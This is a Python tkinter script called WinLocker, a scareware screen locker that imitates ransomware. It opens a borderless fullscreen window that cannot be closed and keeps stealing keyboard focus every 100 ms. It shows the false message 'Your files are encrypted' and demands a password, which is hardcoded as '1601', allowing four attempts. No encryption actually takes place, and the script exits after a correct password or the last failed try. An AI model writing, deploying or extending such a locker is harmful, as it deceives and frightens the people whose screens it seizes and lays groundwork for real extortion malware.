import tkinter as tk
import os

PASSWORD = "1601"
MAX_ATTEMPTS = 4
attempts_left = MAX_ATTEMPTS

class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.configure(bg='#1a3a5c')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        self.win.focus_force()
        
        tk.Label(self.win, text="#OPdailyallowance", bg='#1a3a5c', fg='white', font=('Courier', 16, 'bold')).pack(pady=20)
        tk.Label(self.win, text="Your files are encrypted.", bg='#1a3a5c', fg='#ff4444', font=('Courier', 12)).pack()
        tk.Label(self.win, text="ENTER PASSWORD:", bg='#1a3a5c', fg='white', font=('Courier', 14)).pack(pady=20)
        
        self.pw = tk.Entry(self.win, show="*", font=('Courier', 14), bg='white', fg='black')
        self.pw.pack()
        
        self.sl = tk.Label(self.win, text=f"ATTEMPTS LEFT: {attempts_left}", bg='#1a3a5c', fg='white')
        self.sl.pack(pady=10)
        
        self.pw.bind('<Return>', self.check)
        self.pw.focus_force()
        self.win.after(100, self._keep)
    
    def _keep(self):
        self.win.focus_force()
        self.pw.focus_force()
        self.win.after(100, self._keep)
    
    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            self.sl.config(text="CORRECT!", fg='#0f0')
            self.win.after(1000, lambda: os._exit(0))
        else:
            attempts_left -= 1
            if attempts_left > 0:
                self.sl.config(text=f"WRONG! LEFT: {attempts_left}")
            else:
                self.sl.config(text="404 | ERROR")
                self.win.after(2000, lambda: os._exit(0))

if __name__ == "__main__":
    WinLocker()
    tk.mainloop()
